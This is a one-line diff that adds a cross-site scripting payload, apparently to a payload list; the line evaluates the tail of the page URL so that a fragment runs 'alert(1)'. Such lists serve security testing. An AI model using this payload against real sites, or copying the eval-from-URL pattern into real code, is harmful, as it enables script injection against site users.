@@ -1,0 +1,1 @@
+eval(URL.slice(-8))>#alert(1)
